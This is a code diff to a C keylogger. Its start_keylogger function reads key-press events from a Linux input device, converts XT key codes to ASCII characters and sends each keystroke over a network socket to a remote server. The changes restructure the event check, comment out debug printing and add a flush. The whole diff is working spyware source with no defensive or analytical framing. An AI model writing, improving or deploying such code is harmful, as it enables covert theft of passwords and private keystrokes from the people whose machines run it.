@@ -28,7 +28,6 @@ KeyCodeMap xt_to_ascii_map[] = {
 // Function to convert XT key code to ASCII
 char xt_to_ascii(int key_code) {
     int map_size = sizeof(xt_to_ascii_map) / sizeof(xt_to_ascii_map[0]);
-    
     for (int i = 0; i < map_size; i++) {
         if (xt_to_ascii_map[i].key_code == key_code) {
             return xt_to_ascii_map[i].ascii_char;
@@ -59,12 +58,15 @@ void start_keylogger(int sock, const char *device_path) {
             perror("Read error");
             break;
         }
-
-        if (ev.type == EV_KEY && ev.value == 1) {  // Key press events only
-            printf("key");
-            snprintf(buffer, sizeof(buffer), "%c", xt_to_ascii(ev.code));
-            printf("%s", buffer);
-            send(sock, buffer, strlen(buffer), 0);  // Send key event to server
+        
+        if (ev.type == EV_KEY) {  
+            //printf("Key event: code=%d, value=%d\n", ev.code, ev.value);
+            if (ev.value == 1) {  
+                snprintf(buffer, sizeof(buffer), "%c", xt_to_ascii(ev.code));
+                //printf("Sending: %s\n", buffer);
+                send(sock, buffer, strlen(buffer), 0);  // Send key event to server
+                fflush(NULL);
+            }
         }
     }
 
